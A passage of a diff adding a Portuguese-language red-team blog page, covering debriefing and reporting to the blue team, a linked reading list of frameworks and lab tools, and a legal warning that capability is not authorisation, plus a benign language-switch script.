+      quanto tempo até alguém olhar. Entregue-a à equipa azul como <em>entrada</em> para a engenharia de
+      deteção, não como marcador.
+    </p>
+  </section>
+
+  <section id="pt-handoff">
+    <h2><span class="no">10</span> Entrega à equipa azul e relatório</h2>
+    <p>
+      Uma red team que deixa apenas um PDF desperdiçou o trabalho. O debriefing deve transferir
+      entendimento: que técnicas eram invisíveis, que alertas dispararam sem triagem e que controlos
+      simplesmente não existiam.
+    </p>
+    <ol>
+      <li><b>Cronologia.</b> Cada ação com data e hora, mapeada ao ATT&amp;CK, e o estado de deteção nesse momento.</li>
+      <li><b>Objetivo.</b> Alcançado ou não; se não, que controlo o travou e quanto custaria contorná-lo.</li>
+      <li><b>Evidência.</b> Artefactos com hash, transcrições de comandos, capturas com tokens redigidos.</li>
+      <li><b>Lacunas.</b> Ordenadas pelo esforço de detetar contra o valor de detetar, não pelo ruído da técnica.</li>
+      <li><b>Limpeza.</b> Contas, persistência, ficheiros carregados, política alterada — com prova da remoção.</li>
+      <li><b>Critérios de reteste.</b> O que significa «corrigido» para cada achado, acordado antes de começarem.</li>
+    </ol>
+    <div class="callout">
+      <h4>Relatar deteções, não só shells</h4>
+      <p>
+        A frase que muda a segurança de um cliente é «estivemos na partilha das finanças seis dias e nenhum
+        alerta disparou», não «obtivemos administrador». Escreva a narrativa que um defensor consegue
+        reproduzir nos seus próprios dados e nomeie a fonte de registo que deveria ter apanhado cada passo.
+      </p>
+    </div>
+    <div class="next">
+      <a href="BlueTeams.html">Defensores</a>
+      <a href="EthicalLawsOnIT.html">Ética</a>
+      <a href="Security.html">Intrusões</a>
+    </div>
+  </section>
+
+  <section id="pt-sources">
+    <h2><span class="no">11</span> Fontes e leitura recomendada</h2>
+    <h3>Doutrina e quadros</h3>
+    <ul>
+      <li><a href="https://attack.mitre.org/">ATT&amp;CK</a> — táticas, técnicas e software de grupos reais.</li>
+      <li><a href="https://github.com/center-for-threat-informed-defense/adversary_emulation_library">Emulação</a> — planos por ator do MITRE Engenuity.</li>
+      <li><a href="https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf">TIBER</a> — quadro europeu de red teaming guiado por informação.</li>
+      <li><a href="https://www.bankofengland.co.uk/financial-stability/financial-sector-continuity/cbest">CBEST</a> — o equivalente supervisivo britânico.</li>
+      <li><a href="https://www.pentest-standard.org/index.php/Main_Page">PTES</a> — o modelo de fases por trás da maioria dos relatórios.</li>
+      <li><a href="https://csrc.nist.gov/pubs/sp/800/115/final">NIST</a> — SP 800-115, testes técnicos de segurança.</li>
+    </ul>
+    <h3>Laboratórios e ferramentas</h3>
+    <ul>
+      <li><a href="https://github.com/Orange-Cyberdefense/GOAD">GOAD</a> — laboratório de Active Directory deliberadamente vulnerável.</li>
+      <li><a href="https://github.com/davidprowe/BadBlood">BadBlood</a> — enche um domínio de teste com objetos realistas.</li>
+      <li><a href="https://github.com/redcanaryco/atomic-red-team">Atomic</a> — um teste por técnica, com limpeza.</li>
+      <li><a href="https://github.com/mitre/caldera">Caldera</a> — servidor de emulação automatizada de adversários.</li>
+      <li><a href="https://github.com/BishopFox/sliver">Sliver</a> e <a href="https://github.com/its-a-feature/Mythic">Mythic</a> — plataformas C2 abertas para laboratório.</li>
+      <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a> e <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> — técnicas de Kerberos e credenciais, só em laboratório.</li>
+    </ul>
+    <h3>Neste blogue</h3>
+    <ul>
+      <li><a href="KaliLinux.html">Kali</a>, <a href="metasploit.html">Metasploit</a> e <a href="Suricata.html">Suricata</a> para o detalhe de ferramentas.</li>
+      <li><a href="pentestingSociety.html">Society</a> e <a href="EthicalLawsOnIT.html">Ethics</a> sobre porque o âmbito importa mais que as flags.</li>
+    </ul>
+    <div class="callout law">
+      <h4>Capacidade não é permissão</h4>
+      <p>
+        Acesso, interceção e modificação não autorizados são crime na maioria das jurisdições, incluindo
+        Portugal (<i>Lei do Cibercrime</i>, Lei n.&ordm; 109/2009) e o Brasil (Lei n.&ordm; 12.737/2012).
+        Nada nesta página autoriza coisa alguma; um contrato assinado autoriza, e apenas dentro do seu
+        âmbito.
+      </p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><b>Red Teams</b> &middot; emulação de adversário, laboratórios e doutrina &middot; parte do conjunto Security &amp; Hacking.</p>
+    <p>HTML simples, CSS3 e JavaScript. Sem estilos, scripts, tipos de letra ou imagens externas.</p>
+    <a class="home" href="./index.html">Início</a>
+  </div>
+</footer>
+</div>
+
+<script>
+(function () {
+  "use strict";
+  var blocks = document.querySelectorAll("[data-lang-block]");
+  var links = document.querySelectorAll("[data-lang-switch]");
+
+  function apply(lang) {
+    Array.prototype.forEach.call(blocks, function (block) {
+      block.hidden = block.getAttribute("data-lang-block") !== lang;
+    });
+    Array.prototype.forEach.call(links, function (link) {
+      if (link.getAttribute("data-lang-switch") === lang) { link.setAttribute("aria-current", "true"); }
+      else { link.removeAttribute("aria-current"); }
+    });
+    document.documentElement.lang = lang === "pt" ? "pt-PT" : "en";
+  }
+
+  Array.prototype.forEach.call(links, function (link) {
+    link.addEventListener("click", function (event) {
+      if (event.metaKey || event.ctrlKey || event.shiftKey || event.button) { return; }
+      event.preventDefault();
+      apply(link.getAttribute("data-lang-switch"));
+    });
+  });
+
+  var wanted = new URLSearchParams(location.search).get("lang");
+  if (wanted === "en" || wanted === "pt") { apply(wanted); }
+  else if (location.hash.indexOf("#pt-") === 0) { apply("pt"); }
+})();
+</script>
+</body>
+</html>
